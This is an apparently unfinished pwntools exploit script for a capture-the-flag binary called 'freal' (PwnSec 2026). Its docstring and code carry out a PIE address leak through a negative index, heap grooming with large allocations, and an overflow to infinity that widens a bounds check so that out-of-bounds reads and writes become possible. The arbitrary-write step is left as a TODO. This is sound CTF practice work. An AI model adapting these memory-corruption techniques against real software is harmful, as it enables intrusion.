#!/usr/bin/env python3
"""
Freal World Manipulation — local harness (PwnSec 2026)

Confirmed:
  - view(-11) leaks PIE via __dso_handle (pie+0x5008)
  - 80+ x 8MiB new-decimal makes calibrated() true (budget > 0x1fffffff)
  - load 1e200 / 1e200 + multiply upward overflows to +Inf and sets
    capacity = ((usable>>4)**2)<<7  (huge)
  - large index I: slot = decimal+I*8 (must be mapped and >= _end);
    *slot must be a mapped pointer. view dumps 0x100 bytes from *slot;
    load writes up to 0x1000 raw bytes to *slot.

Missing (P1.G2 / U1):
  a high address (heap0 or libc) so I can be computed, OR an 8-byte plant
  at pie+0x9478 so a 256-byte dump from pie+0x5008 leaks stdout + decimal[0].
"""
from pwn import *
import os

context.binary = BIN = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "artifacts", "freal")
)
context.log_level = "info"


def menu(io):
    io.recvuntil(b"> ")


def new_decimal(io, limbs):
    menu(io)
    io.sendline(b"1")
    io.recvuntil(b"limbs: ")
    io.sendline(str(limbs).encode())
    io.recvuntil(b"ok\n")


def load(io, idx, data: bytes):
    menu(io)
    io.sendline(b"2")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    tok = io.recvuntil((b"bytes: ", b"nan"), drop=False)
    if b"bytes: " not in tok:
        return tok
    io.sendline(str(len(data)).encode())
    io.recvuntil(b"mantissa: ")
    io.send(data)
    return io.recvuntil(b"\n1. new decimal", drop=True)


def view(io, idx):
    menu(io)
    io.sendline(b"3")
    io.recvuntil(b"index: ")
    io.sendline(str(idx).encode())
    return io.recvuntil(b"\n1. new decimal", drop=True)


def multiply(io, left, right, rounding=b"upward"):
    menu(io)
    io.sendline(b"6")
    io.recvuntil(b"left: ")
    io.sendline(str(left).encode())
    io.recvuntil(b"right: ")
    io.sendline(str(right).encode())
    io.recvuntil(b"rounding: ")
    io.sendline(rounding)
    return io.recvuntil(b"\n1. new decimal", drop=True)


def leak_pie(io):
    data = view(io, -11)
    if b"mantissa: " not in data:
        raise RuntimeError("PIE leak failed: %r" % data[:80])
    payload = data.split(b"mantissa: ", 1)[1][:8]
    dso = u64(payload.ljust(8, b"\x00"))
    pie = dso - 0x5008
    return pie


def calibrate_and_widen(io, n=90, limbs=0x800000):
    for i in range(n):
        new_decimal(io, limbs)
        if i % 20 == 0:
            log.info("alloc %d/%d", i, n)
    load(io, 0, b"1e200")
    load(io, 1, b"1e200")
    out = multiply(io, 0, 1, b"upward")
    if b"ok" not in out:
        raise RuntimeError("multiply did not widen capacity: %r" % out[:80])


def main():
    io = process(BIN)
    new_decimal(io, 8)
    pie = leak_pie(io)
    log.success("PIE %s", hex(pie))
    decimal = pie + 0x5060
    log.info("decimal %s stdout@bss %s", hex(decimal), hex(pie + 0x5020))
    # keep the small chunk; more large ones follow (count continues)
    calibrate_and_widen(io, n=90)
    log.info("calibrated + capacity widened")
    # TODO P1.G2: compute I such that decimal+8*I is a mapped slot whose
    # *slot is pie+0x5008 (256-byte dump leaks libc stdout + heap0) or a
    # libc pointer. Then load(I, payload) is an arbitrary write.
    io.interactive()


if __name__ == "__main__":
    main()
